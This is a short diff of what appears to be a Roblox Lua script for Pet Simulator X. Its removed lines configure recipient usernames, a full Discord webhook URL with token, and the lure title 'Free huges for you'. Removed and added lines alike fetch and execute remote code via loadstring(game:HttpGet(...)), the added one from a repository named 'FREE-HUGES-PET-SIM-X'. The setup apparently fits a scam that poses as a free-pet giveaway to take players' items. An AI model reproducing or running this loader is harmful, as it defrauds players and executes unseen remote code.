@@ -1,9 +1,1 @@
-UserName = "n3rfalex"
-Webhook = "https://discord.com/api/webhooks/1151773045250326639/dquM6kBu33ah4viEu52TtTqcZqET99UMdcaZBv24WCBY2084KsN1lHCePPq0kEHV14_n" 
-UserName2 = "pleasedonatepls00"
-
-_G.MailMessage = "hihihi"
-_G.LoadingTitle = "Free huges for you" 
-_G.WebhookName = "CaptainHook"  
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/idkk/main/iddkkk2"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/N3rfbozo/FREE-HUGES-PET-SIM-X/main/Free%20Huges", true))()
